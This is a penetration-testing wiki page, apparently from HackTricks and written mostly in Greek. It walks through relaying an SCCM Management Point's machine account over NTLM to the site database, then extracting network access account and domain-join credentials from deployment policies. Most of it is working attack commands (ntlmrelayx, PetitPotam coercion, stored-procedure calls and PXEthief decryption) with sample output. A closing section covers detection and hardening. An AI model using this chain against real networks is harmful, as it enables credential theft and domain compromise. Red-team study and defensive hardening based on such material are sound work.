# SCCM Management Point NTLM Relay to SQL – OSD Policy Secret Extraction

{{#include ../../banners/hacktricks-training.md}}

## TL;DR
Με την πίεση ενός **System Center Configuration Manager (SCCM) Management Point (MP)** να αυθεντικοποιηθεί μέσω SMB/RPC και **αναμεταδίδοντας** αυτόν τον λογαριασμό μηχανής NTLM στη **βάση δεδομένων του ιστότοπου (MSSQL)** αποκτάτε δικαιώματα `smsdbrole_MP` / `smsdbrole_MPUserSvc`.  Αυτοί οι ρόλοι σας επιτρέπουν να καλέσετε ένα σύνολο αποθηκευμένων διαδικασιών που εκθέτουν **Operating System Deployment (OSD)** blobs (διαπιστευτήρια Network Access Account, μεταβλητές Task-Sequence, κ.λπ.).  Τα blobs είναι κωδικοποιημένα/κρυπτογραφημένα σε hex αλλά μπορούν να αποκωδικοποιηθούν και να αποκρυπτογραφηθούν με **PXEthief**, αποκαλύπτοντας κείμενα μυστικά.

High-level chain:
1. Discover MP & site DB ↦ unauthenticated HTTP endpoint `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.
2. Start `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks`.
3. Coerce MP using **PetitPotam**, PrinterBug, DFSCoerce, κ.λπ.
4. Through the SOCKS proxy connect with `mssqlclient.py -windows-auth` as the relayed **<DOMAIN>\\<MP-host>$** account.
5. Execute:
* `use CM_<SiteCode>`
* `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`
* `exec MP_GetPolicyBody N'<PolicyID>',N'<Version>'`   (or `MP_GetPolicyBodyAfterAuthorization`)
6. Strip `0xFFFE` BOM, `xxd -r -p` → XML  → `python3 pxethief.py 7 <hex>`.

Secrets such as `OSDJoinAccount/OSDJoinPassword`, `NetworkAccessUsername/Password`, κ.λπ. ανακτώνται χωρίς να αγγίξετε PXE ή πελάτες.

---

## 1. Enumerating unauthenticated MP endpoints
Η επέκταση ISAPI του MP **GetAuth.dll** εκθέτει αρκετές παραμέτρους που δεν απαιτούν αυθεντικοποίηση (εκτός αν ο ιστότοπος είναι μόνο PKI):

| Parameter | Purpose |
|-----------|---------|
| `MPKEYINFORMATIONMEDIA` | Επιστρέφει το δημόσιο κλειδί πιστοποίησης υπογραφής του ιστότοπου + GUIDs των συσκευών *x86* / *x64* **All Unknown Computers**. |
| `MPLIST` | Λίστα με κάθε Management-Point στον ιστότοπο. |
| `SITESIGNCERT` | Επιστρέφει το πιστοποιητικό υπογραφής του Primary-Site (αναγνωρίζει τον διακομιστή ιστότοπου χωρίς LDAP). |

Grab the GUIDs that will act as the **clientID** for later DB queries:
```bash
curl http://MP01.contoso.local/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA | xmllint --format -
```
---

## 2. Μεταβίβαση του λογαριασμού μηχανής MP στο MSSQL
```bash
# 1. Start the relay listener (SMB→TDS)
ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support

# 2. Trigger authentication from the MP (PetitPotam example)
python3 PetitPotam.py 10.10.10.20 10.10.10.99 \
-u alice -p P@ssw0rd! -d CONTOSO -dc-ip 10.10.10.10
```
Όταν ενεργοποιηθεί η εξαναγκαστική διαδικασία, θα πρέπει να δείτε κάτι σαν:
```
[*] Authenticating against mssql://10.10.10.15 as CONTOSO/MP01$ SUCCEED
[*] SOCKS: Adding CONTOSO/MP01$@10.10.10.15(1433)
```
---

## 3. Εντοπισμός πολιτικών OSD μέσω αποθηκευμένων διαδικασιών
Συνδεθείτε μέσω του SOCKS proxy (θύρα 1080 από προεπιλογή):
```bash
proxychains mssqlclient.py CONTOSO/MP01$@10.10.10.15 -windows-auth
```
Μεταβείτε στη βάση δεδομένων **CM_<SiteCode>** (χρησιμοποιήστε τον τριψήφιο κωδικό τοποθεσίας, π.χ. `CM_001`).

### 3.1  Βρείτε GUIDs Άγνωστων Υπολογιστών (προαιρετικό)
```sql
USE CM_001;
SELECT SMS_Unique_Identifier0
FROM dbo.UnknownSystem_DISC
WHERE DiscArchKey = 2; -- 2 = x64, 0 = x86
```
### 3.2  Λίστα ανατεθειμένων πολιτικών
```sql
EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N'';
```
Κάθε γραμμή περιέχει `PolicyAssignmentID`,`Body` (hex), `PolicyID`, `PolicyVersion`.

Επικεντρωθείτε σε πολιτικές:
* **NAAConfig**  – Διαπιστευτήρια λογαριασμού πρόσβασης δικτύου
* **TS_Sequence** – Μεταβλητές ακολουθίας εργασιών (OSDJoinAccount/Password)
* **CollectionSettings** – Μπορεί να περιέχει λογαριασμούς εκτέλεσης

### 3.3  Ανάκτηση πλήρους σώματος
Εάν έχετε ήδη `PolicyID` & `PolicyVersion` μπορείτε να παραλείψετε την απαίτηση clientID χρησιμοποιώντας:
```sql
EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
```
> ΣΗΜΑΝΤΙΚΟ: Στο SSMS αυξήστε το “Μέγιστο Πλήθος Χαρακτήρων που Ανακτήθηκαν” (>65535) ή το blob θα κοπεί.

---

## 4. Αποκωδικοποιήστε & αποκρυπτογραφήστε το blob
```bash
# Remove the UTF-16 BOM, convert from hex → XML
echo 'fffe3c003f0078…' | xxd -r -p > policy.xml

# Decrypt with PXEthief (7 = decrypt attribute value)
python3 pxethief.py 7 $(xmlstarlet sel -t -v "//value/text()" policy.xml)
```
Ανακτημένα μυστικά παράδειγμα:
```
OSDJoinAccount : CONTOSO\\joiner
OSDJoinPassword: SuperSecret2025!
NetworkAccessUsername: CONTOSO\\SCCM_NAA
NetworkAccessPassword: P4ssw0rd123
```
---

## 5. Σχετικοί ρόλοι & διαδικασίες SQL
Κατά την αναμετάδοση, η σύνδεση αντιστοιχίζεται σε:
* `smsdbrole_MP`
* `smsdbrole_MPUserSvc`

Αυτοί οι ρόλοι εκθέτουν δεκάδες δικαιώματα EXEC, τα κύρια που χρησιμοποιούνται σε αυτή την επίθεση είναι:

| Αποθηκευμένη Διαδικασία | Σκοπός |
|-------------------------|--------|
| `MP_GetMachinePolicyAssignments` | Λίστα πολιτικών που εφαρμόζονται σε ένα `clientID`. |
| `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | Επιστρέφει το πλήρες σώμα πολιτικής. |
| `MP_GetListOfMPsInSiteOSD` | Επιστρέφεται από τη διαδρομή `MPKEYINFORMATIONMEDIA`. |

Μπορείτε να ελέγξετε τη πλήρη λίστα με:
```sql
SELECT pr.name
FROM   sys.database_principals AS dp
JOIN   sys.database_permissions AS pe ON pe.grantee_principal_id = dp.principal_id
JOIN   sys.objects AS pr ON pr.object_id = pe.major_id
WHERE  dp.name IN ('smsdbrole_MP','smsdbrole_MPUserSvc')
AND  pe.permission_name='EXECUTE';
```
---

## 6. Ανίχνευση & Σκληροποίηση
1. **Παρακολούθηση συνδέσεων MP** – οποιοσδήποτε λογαριασμός υπολογιστή MP που συνδέεται από μια IP που δεν είναι η κεντρική του ≈ relay.
2. Ενεργοποιήστε την **Εκτενή Προστασία για Αυθεντικοποίηση (EPA)** στη βάση δεδομένων του ιστότοπου (`PREVENT-14`).
3. Απενεργοποιήστε το μη χρησιμοποιούμενο NTLM, επιβάλετε την υπογραφή SMB, περιορίστε το RPC (
οι ίδιες μετρήσεις που χρησιμοποιούνται κατά του `PetitPotam`/`PrinterBug`).
4. Σκληρύνετε την επικοινωνία MP ↔ DB με IPSec / αμοιβαίο TLS.

---

## Δείτε επίσης
* Βασικές αρχές NTLM relay:
{{#ref}}
../ntlm/README.md
{{#endref}}

* Κατάχρηση MSSQL & μετα-εκμετάλλευση:
{{#ref}}
abusing-ad-mssql.md
{{#endref}}



## Αναφορές
- [Θα ήθελα να μιλήσω με τον διευθυντή σας: Κλέβοντας μυστικά με Management Point Relays](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
- [PXEthief](https://github.com/MWR-CyberSec/PXEThief)
- [Διαχειριστής Κακής Διαμόρφωσης – ELEVATE-4 & ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
{{#include ../../banners/hacktricks-training.md}}
